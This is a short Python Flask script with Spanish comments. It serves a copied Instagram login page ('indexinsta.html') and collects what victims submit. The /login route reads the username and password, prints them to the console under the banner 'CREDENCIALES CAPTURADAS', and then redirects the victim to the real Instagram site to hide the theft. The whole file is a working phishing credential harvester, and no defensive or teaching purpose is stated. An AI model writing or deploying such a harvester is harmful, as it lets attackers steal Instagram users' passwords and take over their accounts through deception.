from flask import Flask, request, redirect

app = Flask(__name__, static_folder='PruebasHTML', static_url_path='/PruebasHTML')

@app.route('/')
def home():
    try:
        with open('PruebasHTML/indexinsta.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: No se encuentra el archivo indexinsta.html"

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Aquí es donde capturamos los datos
    print("\n" + "="*50)
    print(f" [!] CREDENCIALES CAPTURADAS")
    print(f"Usuario:    {username}")
    print(f"Contraseña: {password}")
    print("="*50 + "\n")
    
    # Redirigir a la página real de Instagram para disimular
    return redirect("https://www.instagram.com/")

if __name__ == '__main__':
    print("Servidor corriendo en http://localhost:5000")
    app.run(debug=False, port=5000)
